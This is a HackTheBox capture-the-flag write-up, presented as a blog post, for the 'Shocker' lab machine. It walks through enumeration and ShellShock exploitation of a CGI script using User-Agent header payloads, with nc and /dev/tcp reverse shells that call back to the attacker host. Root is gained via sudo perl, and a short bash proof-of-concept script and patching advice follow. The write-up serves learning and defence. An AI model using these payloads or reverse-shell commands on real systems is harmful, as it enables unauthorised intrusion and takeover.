@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=520878da84a0dc43527355c5047efa913c39bc97">
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Shocker | Brad’s Blog</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Shocker" />
+<meta name="author" content="Brad Roberts" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Difficulty: Easy Operating System: Linux IP Address: 10.10.10.56 Exploit: ShellShock Escalation: sudo /usr/bin/perl" />
+<meta property="og:description" content="Difficulty: Easy Operating System: Linux IP Address: 10.10.10.56 Exploit: ShellShock Escalation: sudo /usr/bin/perl" />
+<link rel="canonical" href="http://localhost:4000/hackthebox/2021/07/07/shocker.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/2021/07/07/shocker.html" />
+<meta property="og:site_name" content="Brad’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-07T00:00:00-05:00" />
+<script type="application/ld+json">
+{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/2021/07/07/shocker.html"},"@type":"BlogPosting","url":"http://localhost:4000/hackthebox/2021/07/07/shocker.html","author":{"@type":"Person","name":"Brad Roberts"},"headline":"Shocker","dateModified":"2021-07-07T00:00:00-05:00","datePublished":"2021-07-07T00:00:00-05:00","description":"Difficulty: Easy Operating System: Linux IP Address: 10.10.10.56 Exploit: ShellShock Escalation: sudo /usr/bin/perl","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="http://localhost:4000/img/2021-07-07-shocker/shocker.png/#center" />
+    
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" class="a-title-overwrite" href="/">
+          <h1>Brad's Blog</h1>
+        </a>
+        <h2>Offensive Security Aficionado &#x7C; Husband &#x7C; Puppy Herder &#x7C; Snake Charmer</h2>
+        <div id="social-holder"></div>
+          <a href="/"> Home</a> |
+          <a href="/whoami.html">&gt; whoami</a> |
+          <a href="/hackthebox.html">HackTheBox Writeups</a>
+        </div>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>7 July 2021</small>
+<h1>Shocker</h1>
+
+
+
+<p>Difficulty: <code class="language-plaintext highlighter-rouge">Easy</code><br />
+Operating System: <code class="language-plaintext highlighter-rouge">Linux</code><br />
+IP Address: <code class="language-plaintext highlighter-rouge">10.10.10.56</code><br />
+Exploit: <code class="language-plaintext highlighter-rouge">ShellShock</code><br />
+Escalation: <code class="language-plaintext highlighter-rouge">sudo /usr/bin/perl</code> <br /></p>
+
+<hr />
+
+<p>Alright! Welcome to my first writeup, ShellShock was the first vulnerability I ever exploited outside of Metasploit! So this box is super special to me. Since I’m pretty familiar with this kind of vulnerability, let’s do this entire box using ONLY the command line!
+<br /></p>
+
+<h1 id="enumeration">Enumeration</h1>
+<hr />
+
+<p>Let’s begin with a simple <code class="language-plaintext highlighter-rouge">ping</code> see if responds to ICMP:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Shocker]
+└─<span class="nv">$ </span>ping 10.10.10.56
+PING 10.10.10.56 <span class="o">(</span>10.10.10.56<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.56: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>31.9 ms
+64 bytes from 10.10.10.56: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>32.6 ms
+64 bytes from 10.10.10.56: <span class="nv">icmp_seq</span><span class="o">=</span>3 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>32.5 ms
+^C
+<span class="nt">---</span> 10.10.10.56 ping statistics <span class="nt">---</span>
+3 packets transmitted, 3 received, 0% packet loss, <span class="nb">time </span>2003ms
+rtt min/avg/max/mdev <span class="o">=</span> 31.864/32.323/32.616/0.328 ms
+</code></pre></div></div>
+
+<p>Nice! Let’s go ahead and run <code class="language-plaintext highlighter-rouge">nmap</code> and see what ports are open:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Shocker]
+└─<span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">--max-retries</span> 1 10.10.10.56                                            
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-06 21:35 CDT
+Nmap scan report <span class="k">for </span>10.10.10.56
+Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.96 seconds
+</code></pre></div></div>
+<p>I used a few <em>interesting</em> flags in that:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">-p-</code>: specifies that I want <code class="language-plaintext highlighter-rouge">nmap</code> to run against all ports (except 0…)</li>
+  <li><code class="language-plaintext highlighter-rouge">--max-retries 1</code>: Caps the number of port scan probe retransmissions - meaning it’ll only attempt to connect to a port 2 times, 1 for initial hit, and 1 retry. This just makes the scan run faster… However, we have the potential to still miss ports.</li>
+</ol>
+
+<p>Okay so we found port 80 and 2222 are open, I’m going to target the webpage first (port 80). First thing’s first, let’s fuzz common web directories and see what we’re looking at. To do this, I’ll be using a new tool I found, <a href="https://github.com/epi052/feroxbuster">Feroxbuster</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Shocker]
+└─<span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://10.10.10.56:80/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-x</span> sh bash php <span class="nt">-s</span> 200 204 301 
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
+|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
+by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.3.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.56:80/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
+ 👌  Status Codes          │ <span class="o">[</span>200, 204, 301]
+ 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ <span class="o">[</span>sh, bash, php]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+200        9l       13w      137c http://10.10.10.56/index.html
+200        7l       18w        0c http://10.10.10.56/cgi-bin/user.sh
+<span class="o">[</span><span class="c">####################] - 23s   112464/112464  0s      found:2       errors:0      </span>
+<span class="o">[</span><span class="c">####################] - 20s    18744/18744   931/s   http://10.10.10.56:80/</span>
+<span class="o">[</span><span class="c">####################] - 19s    18744/18744   939/s   http://10.10.10.56/cgi-bin/</span>
+                      
+</code></pre></div></div>
+
+<p>We found an interesting page: <code class="language-plaintext highlighter-rouge">/cgi-bin/user.sh</code>. A quick curl reveals the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Shocker]
+└─<span class="nv">$ </span>curl http://10.10.10.56/cgi-bin/user.sh                                                                                                                                                                                               1 ⨯
+Content-Type: text/plain
+
+Just an <span class="nb">uptime test </span>script
+
+ 23:09:28 up  1:04,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+</code></pre></div></div>
+
+<p>Good rule of thumb with <code class="language-plaintext highlighter-rouge">/cgi-bin/[page].sh</code> is to check for ShellShock. We can use the <code class="language-plaintext highlighter-rouge">http-shellshock.nse</code> script with <code class="language-plaintext highlighter-rouge">nmap</code> to test for ShellShock.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Shocker]
+└─<span class="nv">$ </span>nmap <span class="nt">-p</span> 80 <span class="nt">--script</span> http-shellshock.nse <span class="nt">--script-args</span> <span class="nv">uri</span><span class="o">=</span>/cgi-bin/user.sh 10.10.10.56
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-06 21:37 CDT
+Nmap scan report <span class="k">for </span>10.10.10.56
+Host is up <span class="o">(</span>0.041s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-shellshock: 
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE <span class="o">(</span>Exploitable<span class="o">)</span>
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known
+|       as Shellshock. It seems the server is executing commands injected
+|       via malicious HTTP headers.
+|             
+|     Disclosure <span class="nb">date</span>: 2014-09-24
+|     References:
+|       http://www.openwall.com/lists/oss-security/2014/09/24/10
+|       http://seclists.org/oss-sec/2014/q3/685
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-7169
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-6271
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.88 seconds
+</code></pre></div></div>
+
+<p>Well look at that, it reports vulnerable! (imagine my shock - pun 100% intended)</p>
+
+<p><br /></p>
+
+<h1 id="exploitation">Exploitation</h1>
+<hr />
+
+<p>Alright, let’s just double-check and see if we can manually inject code.</p>
+
+<p>First we’ll start a netcat listener using <code class="language-plaintext highlighter-rouge">nc -lnvp 12345</code>, then we’ll execute the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo BRADMAN | nc 10.10.16.192 12345'"</span> http://10.10.10.56/cgi-bin/user.sh
+</code></pre></div></div>
+
+<p>Okay, okay, slow down, what the hell did I just do?</p>
+
+<p>Let’s start at <code class="language-plaintext highlighter-rouge">nc -lnvp 12345</code>, this is going to open up a <strong>network listener</strong> on our local machine on port 12345, meaning we are opening up that port and reporting back any connection information sent to it. We do this with the flag <code class="language-plaintext highlighter-rouge">-lnvp</code>:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">-l</code>: Listener mode for inbound connects</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code>: numeric IP Addresses only, no dns</li>
+  <li><code class="language-plaintext highlighter-rouge">-v</code>: verbose mode</li>
+  <li><code class="language-plaintext highlighter-rouge">-p PORT</code>: the port we’re wanting to open up, in this case: 12345</li>
+</ol>
+
+<p>NetCat is pretty cool and lets us just string all these flags together as <code class="language-plaintext highlighter-rouge">-lnvp</code> or <code class="language-plaintext highlighter-rouge">-nvlp</code> or <code class="language-plaintext highlighter-rouge">-vlnp</code> or … well… you should get the idea.</p>
+
+<p>Next, we need to actually exploit ShellShock - there are super good explanations online for ShellShock, one of my favorites is <a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=5ee60f4e-030f-4691-b5b4-dc3c9e3701d4&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments">here.</a> I recommend reading through that if you’re unfamiliar with ShellShock.</p>
+
+<p>So, my actual payload in the <code class="language-plaintext highlighter-rouge">curl</code> command is<br />
+<code class="language-plaintext highlighter-rouge">/bin/bash -c 'echo BRADMAN | nc 10.10.16.192 12345'</code> <br />
+ What this does <strong>echo</strong>’s “BRADMAN” to netcat, but instead of listening, we’re actually connecting to an IP Address, specifically, my attacker box, and on the port we opened, 12345. When we execute this curl command, we get the following on our netcat listener:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Shocker]
+└─<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 12345  
+listening on <span class="o">[</span>any] 12345 ...
+connect to <span class="o">[</span>10.10.16.192] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.56] 48194
+BRADMAN
+</code></pre></div></div>
+
+<p>NICE! We were not only able to execute code on the target machine, but actually send a message <em>back</em> to our attacker machine! Alright, let’s see if we can get a fully interactive reverse shell. We’ll try to get a /dev/tcp reverse shell using the following:<br />
+<code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.16.192/12345 0&gt;&amp;1</code><br />
+If this works, we should expect to get a fully interactive reverse shell back on our netcat listener (we’ll have to restart our netcat listener).</p>
+
+<p>Exploit:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Shocker]
+└─<span class="nv">$ </span>curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.192/12345 0&gt;&amp;1'"</span> http://10.10.10.56/cgi-bin/user.sh
+</code></pre></div></div>
+
+<p>Shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/Shocker]
+└─<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 12345                                                        130 ⨯
+listening on <span class="o">[</span>any] 12345 ...
+connect to <span class="o">[</span>10.10.16.192] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.56] 48196
+bash: no job control <span class="k">in </span>this shell
+shelly@Shocker:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>shelly<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>shelly<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>shelly<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
+shelly@Shocker:/usr/lib/cgi-bin<span class="nv">$ </span>
+</code></pre></div></div>
+<p><br /></p>
+
+<h1 id="escalation">Escalation</h1>
+<hr />
+
+<p>VERY NICE! Okay, we are now controlling the target machine as user <code class="language-plaintext highlighter-rouge">shelly</code> whomever that is… Let’s look around and see if we can escalate our privileges to root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shelly@Shocker:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>shelly on Shocker:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User shelly may run the following commands on Shocker:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
+shelly@Shocker:/usr/lib/cgi-bin<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>First thing I always check is what can the current user run as <code class="language-plaintext highlighter-rouge">sudo</code> but without a password. To do this, we can run <code class="language-plaintext highlighter-rouge">sudo -l</code>, if we’re prompted for a password and we don’t know it, then we’re out of luck…. however, we’re not out of luck here! We are able to run <code class="language-plaintext highlighter-rouge">/usr/bin/perl</code> as <code class="language-plaintext highlighter-rouge">sudo</code> without the need of a password. Huh, a programming language that we can run as root - I wonder whatever we’ll be able to do with that? Maybe, tell it to start a new shell?</p>
+
+<p>Yup! If you don’t know immediately what to do, don’t worry about it, let’s go to <a href="https://gtfobins.github.io/">GTFOBins</a> and look up perl to see if it has anything. If we search <code class="language-plaintext highlighter-rouge">perl</code> we can see that we can run a myriad of things, the one we’re most interested in is <code class="language-plaintext highlighter-rouge">sudo</code>. According to GTFOBins, we can run <code class="language-plaintext highlighter-rouge">sudo perl -e 'exec "/bin/sh";'</code> and get a shell.. However, look at the results of <code class="language-plaintext highlighter-rouge">sudo -l</code> and you’ll see that we need a TINY adjustment, we just need to specify the full path of perl. Easy enough:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shelly@Shocker:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/perl <span class="nt">-e</span> <span class="s1">'exec "/bin/bash";'</span>
+<span class="nb">sudo</span> /usr/bin/perl <span class="nt">-e</span> <span class="s1">'exec "/bin/bash";'</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">whoami
+</span>root
+<span class="nb">uname</span> <span class="nt">-a</span>
+Linux Shocker 4.4.0-96-generic <span class="c">#119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+</code></pre></div></div>
+
+<p>Alright, now we’re talking. We don’t have a <em>pretty</em> shell but we’re root! And it was pretty easy too. And there we have it, we’ve exploited the machine and obtained root permissions, from here we can read the <code class="language-plaintext highlighter-rouge">/home/shelly/user.txt</code> and the <code class="language-plaintext highlighter-rouge">/root/root.txt</code> and get our whole 0 points from HackTheBox!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+shelly@Shocker:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/perl <span class="nt">-e</span> <span class="s1">'exec "/bin/bash";'</span>
+<span class="nb">sudo</span> /usr/bin/perl <span class="nt">-e</span> <span class="s1">'exec "/bin/bash";'</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">whoami
+</span>root
+<span class="nb">cat</span> /home/shelly/user.txt
+13f51b&lt;<span class="nt">--</span> REDACTED <span class="nt">--</span><span class="o">&gt;</span>
+<span class="nb">cat</span> /root/root.txt  
+b1fd49&lt;<span class="nt">--</span> REDACTED <span class="nt">--</span><span class="o">&gt;</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<h1 id="super-basic-poc">Super basic POC</h1>
+<hr />
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/bash</span>
+
+<span class="c"># Super Basic POC Exploit code for HackTheBox Shocker</span>
+<span class="c"># Utilizes the ShellShock exploit</span>
+
+<span class="c"># Author: Brad Roberts</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-lt</span> 2 <span class="o">]</span><span class="p">;</span><span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> [LHOST</span><span class="se">\]</span><span class="s2"> [LPORT]"</span>
+    <span class="nb">exit </span>1
+<span class="k">fi
+
+</span><span class="nv">LHOST</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">LPORT</span><span class="o">=</span><span class="nv">$2</span>
+
+<span class="nv">TARGET</span><span class="o">=</span><span class="s2">"http://10.10.10.56/cgi-bin/user.sh"</span>
+
+<span class="nv">PAYLOAD</span><span class="o">=</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/</span><span class="k">${</span><span class="nv">LHOST</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">LPORT</span><span class="k">}</span><span class="s2"> 0&gt;&amp;1'"</span>
+
+curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; echo; </span><span class="k">${</span><span class="nv">PAYLOAD</span><span class="k">}</span><span class="s2">"</span> <span class="k">${</span><span class="nv">TARGET</span><span class="k">}</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<h1 id="im-vulnerable-to-shellshock-how-do-i-fix-this">I’m vulnerable to ShellShock, how do I fix this?</h1>
+<hr />
+
+<p>First off, your webpage might just be vulnerable to OS Injection that happens to look like ShellShock. It’s prolly vulnerable but just to be sure, double check by running the following:<br />
+<code class="language-plaintext highlighter-rouge">env val='() { :; }; echo VULNERABLE' bash -c "echo Hello World"</code></p>
+
+<p>If you see <code class="language-plaintext highlighter-rouge">VULNERABLE</code> then, you guessed it…</p>
+
+<p>This is a vulnerability in bash itself so to fix this, you’ll have to update bash.</p>
+
+<p>Update with apt:<br />
+<code class="language-plaintext highlighter-rouge">sudo apt-get update &amp;&amp; sudo apt-get install --only-upgrade bash</code></p>
+
+<p>Update with yum:<br />
+<code class="language-plaintext highlighter-rouge">sudo yum update bash</code></p>
+
+<p>Good rule of thumb is to always stay up-to-date on patches!</p>
+
+
+
+  <small>tags: <em>HTB</em></small>
+
+
+      </section>
+    </div>
+
+    <footer>
+      <div class="container" id="footer">
+        <div id="social-holder">
+          <a class="social-icons" href="https://www.linkedin.com/in/bradley-roberts/" target="_blank">
+            <img alt="Linkedin" src="/assets/images/linkedin.png">
+          </a>
+          <a class="social-icons" href="https://app.hackthebox.eu/profile/196643" target="_blank">
+            <img alt="HackTheBox" src="/assets/images/htb.png">
+          </a>
+          <a class="social-icons" href="https://github.com/ABradRoberts/" target="_blank">
+            <img alt="Github" src="/assets/images/github.png">
+          </a>
+      </div>
+    </div>
+    </footer>
+  </body>
+</html>
